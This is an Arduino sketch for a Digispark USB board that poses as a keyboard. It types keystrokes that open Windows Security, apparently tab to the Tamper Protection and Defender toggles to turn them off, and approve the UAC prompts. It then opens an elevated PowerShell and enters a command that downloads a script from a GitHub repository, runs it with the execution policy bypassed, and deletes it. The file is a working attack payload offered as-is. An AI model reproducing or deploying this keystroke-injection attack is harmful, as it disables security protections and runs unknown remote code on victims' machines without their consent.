#include "DigiKeyboard.h"

void setup() {
    DigiKeyboard.sendKeyStroke(0);  // Initialize keyboard
    
    DigiKeyboard.delay(1000);  // Initial delay to ensure system is ready

    DigiKeyboard.sendKeyStroke(KEY_ESC, MOD_CONTROL_LEFT);  // CTRL + ESC to open Start menu
    DigiKeyboard.delay(1000);
    DigiKeyboard.print("windows security");  // Type "windows security"
    DigiKeyboard.delay(700);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);  // Press Enter to open Windows Security
    DigiKeyboard.delay(1500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);  // Press Enter again if required
    DigiKeyboard.delay(700);  // Delay to ensure Windows Security is fully opened
    DigiKeyboard.sendKeyStroke(KEY_TAB);  // Press TAB
    DigiKeyboard.delay(150);
    DigiKeyboard.sendKeyStroke(KEY_TAB);  // Press TAB again
    DigiKeyboard.delay(150);
    DigiKeyboard.sendKeyStroke(KEY_TAB);  // Press TAB again
    DigiKeyboard.delay(150);
    DigiKeyboard.sendKeyStroke(KEY_TAB);  // Press TAB again
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);  // Press Enter
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_TAB);  // Press TAB to navigate
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_TAB);  // Press TAB again
    DigiKeyboard.delay(150);
    DigiKeyboard.sendKeyStroke(KEY_TAB);  // Keep tabbing until the Tamper Protection toggle is selected
    DigiKeyboard.delay(150);
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(150);
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(150);
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(150);
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(150);
    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_SHIFT_LEFT);
    DigiKeyboard.delay(700);
    DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ESC, MOD_CONTROL_LEFT);  // CTRL + ESC to open Start menu again
    DigiKeyboard.delay(1000);
    DigiKeyboard.print("windows security");  // Type "windows security" again
    DigiKeyboard.delay(700);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);  // Press Enter to open Windows Security
    DigiKeyboard.delay(1500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);  // Press Enter again if required
    DigiKeyboard.delay(700);  // Delay to ensure Windows Security is fully opened
    DigiKeyboard.sendKeyStroke(KEY_TAB);  // Press TAB
    DigiKeyboard.delay(150);
    DigiKeyboard.sendKeyStroke(KEY_TAB);  // Press TAB again
    DigiKeyboard.delay(150);
    DigiKeyboard.sendKeyStroke(KEY_TAB);  // Press TAB again
    DigiKeyboard.delay(150);
    DigiKeyboard.sendKeyStroke(KEY_TAB);  // Press TAB again
    DigiKeyboard.delay(150);
    DigiKeyboard.sendKeyStroke(KEY_TAB);  // Press TAB again
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);  // Press Enter
    DigiKeyboard.delay(500);

    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_SHIFT_LEFT);
    DigiKeyboard.delay(700);
    DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    delay(700);
    DigiKeyboard.print("powershell");
    delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
    delay(1500);
    DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
    delay(1800);
    DigiKeyboard.print("Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/Darkhaxxor005/host/refs/heads/main/t.ps1\" -OutFile \"$env:TEMP\\downloadedScript.ps1\"; powershell.exe -ExecutionPolicy Bypass -File \"$env:TEMP\\downloadedScript.ps1\"; Remove-Item \"$env:TEMP\\downloadedScript.ps1\" -Force");
    delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    delay(5000);
    DigiKeyboard.print("exit");
    delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

}

void loop() {
    // No repeating actions needed, so leave empty
}
